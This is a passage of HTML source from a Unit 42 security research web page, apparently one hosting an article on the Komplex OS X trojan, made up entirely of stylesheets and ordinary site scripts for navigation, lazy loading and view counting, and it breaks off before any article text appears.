.wp-block-co-authors-plus-image{margin-bottom:0}.wp-block-co-authors-plus-image :where(img){height:auto;max-width:100%;vertical-align:bottom}.wp-block-co-authors-plus-coauthors.is-layout-flow .wp-block-co-authors-plus-image :where(img){vertical-align:middle}.wp-block-co-authors-plus-image:is(.alignfull,.alignwide) :where(img){width:100%}.wp-block-co-authors-plus-image:is(.alignleft,.alignright){display:table}.wp-block-co-authors-plus-image.aligncenter{display:table;margin-inline:auto}

</style>
<style id='safe-svg-svg-icon-style-inline-css'>
.safe-svg-cover{text-align:center}.safe-svg-cover .safe-svg-inside{display:inline-block;max-width:100%}.safe-svg-cover svg{height:100%;max-height:100%;max-width:100%;width:100%}

</style>
<style id='classic-theme-styles-inline-css'>
/*! This file is auto-generated */
.wp-block-button__link{color:#fff;background-color:#32373c;border-radius:9999px;box-shadow:none;text-decoration:none;padding:calc(.667em + 2px) calc(1.333em + 2px);font-size:1.125em}.wp-block-file__button{background:#32373c;color:#fff;text-decoration:none}
</style>
<style id='global-styles-inline-css'>
:root{--wp--preset--aspect-ratio--square: 1;--wp--preset--aspect-ratio--4-3: 4/3;--wp--preset--aspect-ratio--3-4: 3/4;--wp--preset--aspect-ratio--3-2: 3/2;--wp--preset--aspect-ratio--2-3: 2/3;--wp--preset--aspect-ratio--16-9: 16/9;--wp--preset--aspect-ratio--9-16: 9/16;--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);}:where(.is-layout-flex){gap: 0.5em;}:where(.is-layout-grid){gap: 0.5em;}body .is-layout-flex{display: flex;}.is-layout-flex{flex-wrap: wrap;align-items: center;}.is-layout-flex > :is(*, div){margin: 0;}body .is-layout-grid{display: grid;}.is-layout-grid > :is(*, div){margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}
:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}
:root :where(.wp-block-pullquote){font-size: 1.5em;line-height: 1.6;}
</style>
<link rel='stylesheet' id='post-views-counter-frontend-css' href='https://unit42.paloaltonetworks.com/wp-content/plugins/post-views-counter/css/frontend.min.css?ver=1.4.8' media='all' />
<link rel='stylesheet' id='wpml-legacy-post-translations-0-css' href='https://unit42.paloaltonetworks.com/wp-content/plugins/sitepress-multilingual-cms/templates/language-switchers/legacy-post-translations/style.min.css?ver=1' media='all' />
<link rel='stylesheet' id='unit42-v6-style-css' href='https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/style.css?ver=1.0.0' media='all' />
<link rel='stylesheet' id='unit42-v6-head-styles-css' href='https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/css/head-styles.css?ver=1.0.0' media='all' />
<link rel='stylesheet' id='unit42-v5-custom-styles-css' href='https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/css/main.css?ver=1.0.0' media='all' />
<link rel='stylesheet' id='unit42-v6-plugin-styles-css' href='https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/css/plugin.css?ver=1.0.0' media='all' />
<link rel='stylesheet' id='unit42-v6-custom-styles-css' href='https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/css/main-redesign.css?v1&#038;ver=1.0.0' media='all' />
<link rel='stylesheet' id='like-dislike-css' href='https://unit42.paloaltonetworks.com/wp-content/plugins/like-dislike-counter-for-posts-pages-and-comments/css/ldc-lite.css?ver=1.0.0' media='all' />
<script src="https://unit42.paloaltonetworks.com/wp-includes/js/jquery/jquery.min.js?ver=3.7.1" id="jquery-core-js"></script>
<script src="https://unit42.paloaltonetworks.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.4.1" id="jquery-migrate-js"></script>
<script id="crayon_js-js-extra">
var CrayonSyntaxSettings = {"version":"_2.7.2_beta","is_admin":"0","ajaxurl":"https:\/\/unit42.paloaltonetworks.com\/wp-admin\/admin-ajax.php","prefix":"crayon-","setting":"crayon-setting","selected":"crayon-setting-selected","changed":"crayon-setting-changed","special":"crayon-setting-special","orig_value":"data-orig-value","debug":""};
var CrayonSyntaxStrings = {"copy":"Press %s to Copy, %s to Paste","minimize":"Click To Expand Code"};
</script>
<script src="https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/js/min/crayon.min.js?ver=_2.7.2_beta" id="crayon_js-js"></script>
<script id="post-views-counter-frontend-js-before">
var pvcArgsFrontend = {"mode":"js","postID":19694,"requestURL":"https:\/\/unit42.paloaltonetworks.com\/wp-admin\/admin-ajax.php","nonce":"ae92a8112c","dataStorage":"cookies","multisite":false,"path":"\/","domain":""};
</script>
<script src="https://unit42.paloaltonetworks.com/wp-content/plugins/post-views-counter/js/frontend.min.js?ver=1.4.8" id="post-views-counter-frontend-js"></script>
<script id="wpml-xdomain-data-js-extra">
var wpml_xdomain_data = {"css_selector":"wpml-ls-item","ajax_url":"https:\/\/unit42.paloaltonetworks.com\/wp-admin\/admin-ajax.php","current_lang":"en","_nonce":"7d8483a715"};
</script>
<script src="https://unit42.paloaltonetworks.com/wp-content/plugins/sitepress-multilingual-cms/res/js/xdomain-data.js?ver=4.6.15" id="wpml-xdomain-data-js" defer data-wp-strategy="defer"></script>
<link rel="https://api.w.org/" href="https://unit42.paloaltonetworks.com/wp-json/" /><link rel="alternate" title="JSON" type="application/json" href="https://unit42.paloaltonetworks.com/wp-json/wp/v2/posts/19694" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://unit42.paloaltonetworks.com/xmlrpc.php?rsd" />
<meta name="generator" content="WordPress 6.7.1" />
<link rel='shortlink' href='https://unit42.paloaltonetworks.com/?p=19694' />
<link rel="alternate" title="oEmbed (JSON)" type="application/json+oembed" href="https://unit42.paloaltonetworks.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Funit42.paloaltonetworks.com%2Funit42-sofacys-komplex-os-x-trojan%2F" />
<link rel="alternate" title="oEmbed (XML)" type="text/xml+oembed" href="https://unit42.paloaltonetworks.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Funit42.paloaltonetworks.com%2Funit42-sofacys-komplex-os-x-trojan%2F&#038;format=xml" />
<meta name="generator" content="WPML ver:4.6.15 stt:1,28;" />
<meta name="google-site-verification" content="zHZtYOWm9hm4SZgsH7wqiYcOwmsAsxDUDU4UD1QxB40" /><style>#wpdevart_lb_overlay{background-color:#000000;} #wpdevart_lb_overlay.wpdevart_opacity{opacity:0.8 !important;} #wpdevart_lb_main_desc{
				 -webkit-transition: opacity 0.3s ease;
				 -moz-transition: opacity 0.3s ease;
				 -o-transition: opacity 0.3s ease;
				 transition: opacity 0.3s ease;} #wpdevart_lb_information_content{
				 -webkit-transition: opacity 0.3s ease;
				 -moz-transition: opacity 0.3s ease;
				 -o-transition: opacity 0.3s ease;
				 transition: opacity 0.3s ease;}
		#wpdevart_lb_information_content{
			width:100%;	
			padding-top:0px;
			padding-bottom:0px;
		}
		#wpdevart_info_counter_of_imgs{
			    display: inline-block;
				padding-left:15px;
				padding-right:4px;
				font-size:20px;
				color:#000000;
		}
		#wpdevart_info_caption{
			    display: inline-block;
				padding-left:15px;
				padding-right:4px;
				font-size:20px;
				color:#000000;
		}
		#wpdevart_info_title{
			    display: inline-block;
				padding-left:5px;
				padding-right:5px;
				font-size:15px;
				color:#000000;
		}
		@-webkit-keyframes rotate {
			to   {-webkit-transform: rotate(360deg);}
			from  {-webkit-transform: rotate(0deg);}
		}
		@keyframes rotate {
			to   {transform: rotate(360deg);}
			from  {transform: rotate(0deg);}
		}
		#wpdevart_lb_loading_img,#wpdevart_lb_loading_img_first{
			-webkit-animation: rotate 2s linear  infinite;
    		animation: rotate 2s linear infinite;
		}
	  </style>      <link rel="icon" href="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/icon-Unit42-180x180-1.png" sizes="32x32" />
<link rel="icon" href="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/icon-Unit42-180x180-1.png" sizes="192x192" />
<link rel="apple-touch-icon" href="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/icon-Unit42-180x180-1.png" />
<meta name="msapplication-TileImage" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/icon-Unit42-180x180-1.png" />
<script>var $ = jQuery;</script>

    <script type="text/javascript">
    ;(function(win, doc, style, timeout) {
    var STYLE_ID = 'at-body-style';
    function getParent() {
    return doc.getElementsByTagName('head')[0];
    }
    function addStyle(parent, id, def) {
        if (!parent) {
        return;
        }
        var style = doc.createElement('style');
        style.id = id;
        style.innerHTML = def;
        parent.appendChild(style);
    }
    function removeStyle(parent, id) {
        if (!parent) {
            return;
        }
        var style = doc.getElementById(id);
        if (!style) {
            return;
        }
        parent.removeChild(style);
    }
    addStyle(getParent(), STYLE_ID, style);
    setTimeout(function() {
    removeStyle(getParent(), STYLE_ID);
    }, timeout);
    }(window, document, "body {visibility:hidden !important}", 3000));
    </script>

            <script src="https://assets.adobedtm.com/9273d4aedcd2/0d76ae0322d7/launch-425c423d843b.min.js" async></script>
            <script type="text/javascript" src="https://www.paloaltonetworks.com/content/dam/pan/en_US/includes/attribution.js"></script>


<script type="text/javascript">
var isIE11 = !!navigator.userAgent.match(/Trident.*rv\:11\./);
if(isIE11){
    var polyfill = 'https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/scripts/polyfill.min.js';
    document.write('<script type="text/javascript" src="'+polyfill+'">\x3C/script>');
}
    /**
 * String.prototype.replaceAll() polyfill
 * https://gomakethings.com/how-to-replace-a-section-of-a-string-with-another-one-with-vanilla-js/
 * @author Chris Ferdinandi
 * @license MIT
 */
if (!String.prototype.replaceAll) {
	String.prototype.replaceAll = function(str, newStr){
		// If a regex pattern
		if (Object.prototype.toString.call(str).toLowerCase() === '[object regexp]') {
			return this.replace(str, newStr);
		}
		// If a string
		return this.replace(new RegExp(str, 'g'), newStr);
	};
}

    /*! lozad.js - v1.16.0 - 2020-09-06 */
!function(t,e){"object"==typeof exports&&"undefined"!=typeof module?module.exports=e():"function"==typeof define&&define.amd?define(e):t.lozad=e()}(this,function(){"use strict";
/**
   * Detect IE browser
   * @const {boolean}
   * @private
   */var g="undefined"!=typeof document&&document.documentMode,f={rootMargin:"0px",threshold:0,load:function(t){if("picture"===t.nodeName.toLowerCase()){var e=t.querySelector("img"),r=!1;null===e&&(e=document.createElement("img"),r=!0),g&&t.getAttribute("data-iesrc")&&(e.src=t.getAttribute("data-iesrc")),t.getAttribute("data-alt")&&(e.alt=t.getAttribute("data-alt")),r&&t.append(e)}if("video"===t.nodeName.toLowerCase()&&!t.getAttribute("data-src")&&t.children){for(var a=t.children,o=void 0,i=0;i<=a.length-1;i++)(o=a[i].getAttribute("data-src"))&&(a[i].src=o);t.load()}t.getAttribute("data-poster")&&(t.poster=t.getAttribute("data-poster")),t.getAttribute("data-src")&&(t.src=t.getAttribute("data-src")),t.getAttribute("data-srcset")&&t.setAttribute("srcset",t.getAttribute("data-srcset"));var n=",";if(t.getAttribute("data-background-delimiter")&&(n=t.getAttribute("data-background-delimiter")),t.getAttribute("data-background-image"))t.style.backgroundImage="url('"+t.getAttribute("data-background-image").split(n).join("'),url('")+"')";else if(t.getAttribute("data-background-image-set")){var d=t.getAttribute("data-background-image-set").split(n),u=d[0].substr(0,d[0].indexOf(" "))||d[0];// Substring before ... 1x
u=-1===u.indexOf("url(")?"url("+u+")":u,1===d.length?t.style.backgroundImage=u:t.setAttribute("style",(t.getAttribute("style")||"")+"background-image: "+u+"; background-image: -webkit-image-set("+d+"); background-image: image-set("+d+")")}t.getAttribute("data-toggle-class")&&t.classList.toggle(t.getAttribute("data-toggle-class"))},loaded:function(){}};function A(t){t.setAttribute("data-loaded",!0)}var m=function(t){return"true"===t.getAttribute("data-loaded")},v=function(t){var e=1<arguments.length&&void 0!==arguments[1]?arguments[1]:document;return t instanceof Element?[t]:t instanceof NodeList?t:e.querySelectorAll(t)};return function(){var r,a,o=0<arguments.length&&void 0!==arguments[0]?arguments[0]:".lozad",t=1<arguments.length&&void 0!==arguments[1]?arguments[1]:{},e=Object.assign({},f,t),i=e.root,n=e.rootMargin,d=e.threshold,u=e.load,g=e.loaded,s=void 0;"undefined"!=typeof window&&window.IntersectionObserver&&(s=new IntersectionObserver((r=u,a=g,function(t,e){t.forEach(function(t){(0<t.intersectionRatio||t.isIntersecting)&&(e.unobserve(t.target),m(t.target)||(r(t.target),A(t.target),a(t.target)))})}),{root:i,rootMargin:n,threshold:d}));for(var c,l=v(o,i),b=0;b<l.length;b++)(c=l[b]).getAttribute("data-placeholder-background")&&(c.style.background=c.getAttribute("data-placeholder-background"));return{observe:function(){for(var t=v(o,i),e=0;e<t.length;e++)m(t[e])||(s?s.observe(t[e]):(u(t[e]),A(t[e]),g(t[e])))},triggerLoad:function(t){m(t)||(u(t),A(t),g(t))},observer:s}}});

</script>

<!-- <script src="https://www.google.com/recaptcha/api.js"></script>  -->

<!--  End: Scripts Migrated From Unit42-v5 -->

    </head>
<body class="post-template-default single single-post postid-19694 single-format-standard no-sidebar">
<header class="haeder py-15 position-relative z-index-2" style="display: none;">
  <div class="container px-sm-30 px-35">
    <div class="row">
        <div class="first-logo col-sm-auto col-6 mb-sm-0 mb-40 text-sm-center order-1">
                        <a href="https://www.paloaltonetworks.com/">
                <img src="/wp-content/uploads/2021/07/PANW_Parent.png" width="140px" alt="Logo" />
            </a>
        </div>
      <div class="col-sm-auto col-6 text-sm-center order-sm-2 order-4 second-logo-unit">
        <a href="https://unit42.paloaltonetworks.com/">
            <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/unit42-logo-white.svg" class="attachment-full size-full" alt="Unit42 Logo"  width="150" height="35"/>
        </a>
      </div>

      <div class="col-auto d-sm-none ml-auto mb-40 order-2">
        <button class="btn__search" data-toggle="collapse" data-target="#search" aria-label="search"><i class="ui ui-1"></i></button>
      </div>

      <div id="search" class="collapse d-sm-block col-sm-auto col-12 ml-auto order-3">
        <div class="pt-sm-0 pt-20 pb-sm-0 pb-40 mt-sm-0 mt-n30">
                      <input type="search" placeholder="Search Unit 42" id="innerSearch" class="header__search" value="" required aria-label="Inner Search">
                  </div>
      </div>

      <div class="col-auto d-sm-none d-flex ml-auto align-items-center order-5">
        <button class="btn__menu rounded" data-toggle="collapse" data-target="#navigation">Menu</button>
      </div>
    </div>
  </div>
</header>

<nav id="navigation" class="site-nav collapse d-sm-block pb-20 mt-sm-10"  style="display: none!important;">
  <div class="container px-sm-30">
    <ul id="menu-primary-navigation" class="main-menu d-sm-flex font-weight-medium"><li id="menu-item-97290" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-97290"><a href="https://unit42.paloaltonetworks.com/tools/">Tools</a></li>
<li id="menu-item-41" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-41"><a href="https://unit42.paloaltonetworks.com/atoms/">ATOMs</a></li>
<li id="menu-item-119884" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-119884"><a target="_blank" href="https://www.paloaltonetworks.com/unit42">Security Consulting</a></li>
<li id="menu-item-81229" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-81229"><a href="https://unit42.paloaltonetworks.com/about-unit-42/">About Us</a></li>
<li id="menu-item-121229" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-121229"><a href="https://start.paloaltonetworks.com/contact-unit42.html"><b style="color:#C84727">Under Attack?</b></a></li>
</ul>  </div>
</nav>
<div class="panClean pan-template-home" id="main-nav-menu-cont" style="display:none;">
    <div class="cleanHeader mainNavigationComp baseComponent parbase">
        <div class="productNav2021Component dark default" id="PAN_2021_NAV_ASYNC">
        </div>
  </div>
<div class="cleanTopHtml htmlComp baseComponent parbase"><div class="base-component-spacer spacer-none  "></div>
</div>
</div>
<!--  Start: Scripts Migrated From Unit42-v5 -->
<script type="text/javascript">
	function getCookie(cname) {
	 	var name = cname + "=";
  		var decodedCookie = decodeURIComponent(document.cookie);
		var ca = decodedCookie.split(';');
  		for(var i = 0; i <ca.length; i++) {
    			var c = ca[i];
    			while (c.charAt(0) == ' ') {
     				 c = c.substring(1);
    			}
    			if (c.indexOf(name) == 0) {
    				 return c.substring(name.length, c.length);
    			}
  		}
  		return "";
	}

	var referer = "";//sessionStorage.container;
	var pcontainer = sessionStorage.getItem("container");
	var searchResultsPagePath = "";
	if(((pcontainer) && pcontainer.indexOf('Prisma')!=-1)){
	    referer = 'Prisma' ;
	}        
        else if(((pcontainer) && pcontainer.indexOf('Cortex')!=-1)){
            if( pcontainer.indexOf('CloudCortex') != -1){
                referer = 'CloudCortex' ;
            }
            else{
                referer = 'Cortex' ;
            }	    
	}
        else if(((pcontainer) && pcontainer.indexOf('Sase')!=-1)){
	    referer = 'Sase' ;
	}
	else if(((pcontainer) && pcontainer.indexOf('Unit')!=-1)){
	    referer = 'Unit' ;
	}
	else if(((pcontainer) && pcontainer.indexOf('Ngfw')!=-1)){
	    referer = 'Ngfw' ;
	}
        var fromRef = document.referrer;
        var nContainer = getCookie("navContainer");
        if(nContainer){//If user is coming from main site, we need to reset the container		
		if(fromRef  && fromRef.indexOf("prismacloud.io")!=-1){
                        referer = 'Prisma' ;
                        sessionStorage.setItem("container","Prisma");
                } else if(fromRef.indexOf("paloaltonetworks.com")!=-1 || fromRef.indexOf("paloaltonetworks.jp")!=-1 ){
                        if(nContainer.indexOf('Prisma') != -1){
                            referer = 'Prisma' ;
                            sessionStorage.setItem("container","Prisma");
                        }
                        if(nContainer.indexOf('Cortex') != -1){
                            if( nContainer.indexOf('CloudCortex') != -1){
                                referer = 'CloudCortex';
                                sessionStorage.setItem("container","CloudCortex");
                            }
                            else{
                                referer = 'Cortex';
                                sessionStorage.setItem("container","Cortex");
                            }                            
                        }
			if(nContainer.indexOf('Sase') != -1){
                            referer = 'Sase' ;
                            sessionStorage.setItem("container","Sase");
                        }
			if(nContainer.indexOf('Unit') != -1){
                            referer = 'Unit' ;
                            sessionStorage.setItem("container","Unit");
                        }
			if(nContainer.indexOf('Ngfw') != -1){
                            referer = 'Ngfw' ;
                            sessionStorage.setItem("container","Ngfw");
                        }
			document.cookie = 'navContainer=; path=/; domain=.paloaltonetworks.com; expires=' + new Date(0).toUTCString();
		}
	}
if(referer != "Prisma" && referer != "CloudCortex" && referer != "Cortex" && referer != "Sase" && referer != "Unit" && referer != "Ngfw") {
    referer = 'Unit' ;
    sessionStorage.setItem("container","Unit");
}
function callMainSitePrismaNavHTML(){
    
    var referrer_domain = 'https://www.paloaltonetworks.com';
    sessionStorage.setItem("domain",referrer_domain);
    if(referer == 'Prisma'){
        var menu_url = referrer_domain+'/_jcr_content/globals/cleanHeaderPrisma.prismaRenderer.html';
        searchResultsPagePath = referrer_domain+"/search/prismasearch";
        }
    if(referer == 'CloudCortex'){
        var menu_url = 'https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/unit-nav-renderer.php?type=cortexcloud';
        searchResultsPagePath = referrer_domain+"/search/cortexcloudsearch";	
    }
    if(referer == 'Cortex'){
        var menu_url = referrer_domain+'/_jcr_content/globals/cleanHeaderCortex.cortexRenderer.html';	
        searchResultsPagePath = referrer_domain+"/search/cortexsearch";	
    }
    if(referer == 'Sase'){
        var menu_url = referrer_domain+'/_jcr_content/globals/cleanHeaderSase.saseRenderer.html';
        searchResultsPagePath = referrer_domain+"/search/sasesearch";
    }
    if(referer == 'Unit'){
        var menu_url = 'https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/unit-nav-renderer.php?type=unit42';
        searchResultsPagePath = referrer_domain+"/content/pan/en_US/search/unit42search";
		    }
    if(referer == 'Ngfw'){
        var menu_url = 'https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/ngfw-cdss-nav-renderer.php';
        searchResultsPagePath = referrer_domain+"/search/ngfwcdsssearch";
    }
    httpGet(menu_url,'menu_html');
    document.getElementById('main-nav-menu-cont').removeAttribute("style");
}
function addStyle(styles) {            
    /* Create style document */
    var css = document.createElement('style');
    css.type = 'text/css';

    if (css.styleSheet) 
        css.styleSheet.cssText = styles;
    else 
        css.appendChild(document.createTextNode(styles));

    /* Append style to the tag name */
    document.getElementsByTagName("head")[0].appendChild(css);
}
function httpGet(theUrl,req_type) {
    if (window.XMLHttpRequest) { // code for IE7+, Firefox, Chrome, Opera, Safari
        xmlhttp=new XMLHttpRequest();
    } else {// code for IE6, IE5
        xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
    }
    xmlhttp.onreadystatechange=function()
    {
        if (xmlhttp.readyState==4 && xmlhttp.status==200)
        {
            if(req_type == 'menu_html'){
            var nav_text = xmlhttp.responseText.replaceAll('https://static.cloud.coveo.com/searchui/v2.9159/js/CoveoJsSearch.Lazy.min.js', '');
            nav_text = nav_text.replaceAll('src="/', 'src="'+maindomain_lang+'/');
            nav_text = nav_text.replaceAll("'/content", "'"+maindomain_lang+"/content");
                        
            document.getElementById("PAN_2021_NAV_ASYNC").innerHTML = nav_text.replaceAll('href="/', 'href="'+maindomain_lang+'/');

            var lozad_back = document.getElementsByClassName('lozad-background');
            Array.prototype.forEach.call(lozad_back, function(el) {
            // Do stuff here
            var el_back_img_path = el.getAttribute('data-background-image');
            var first_pos = el_back_img_path.indexOf("'");
            var last_pos = el_back_img_path.indexOf("'",first_pos+1);
            el_back_img_path = el_back_img_path.substring(first_pos+1,last_pos);
            el.setAttribute("data-background-image",main_site_url+el_back_img_path);
            });
            const observer_lozad = lozad('.lozad, .lozad-background'); // lazy loads elements with default selector as '.lozad'
            observer_lozad.observe();
            }
            if(req_type == 'head_inline_css'){
            addStyle(xmlhttp.responseText);
            }
        }
    }
    xmlhttp.open("GET", theUrl, true );
    xmlhttp.send();    
}    
    
if(referer == 'Prisma' || referer == 'CloudCortex' || referer == 'Cortex' || referer == 'Sase' || referer == 'Unit' || referer == 'Ngfw'){
    const article = document.querySelector('#PAN_2021_NAV_ASYNC');
    if(referer == 'Prisma'){
        article.dataset.type = 'prisma';
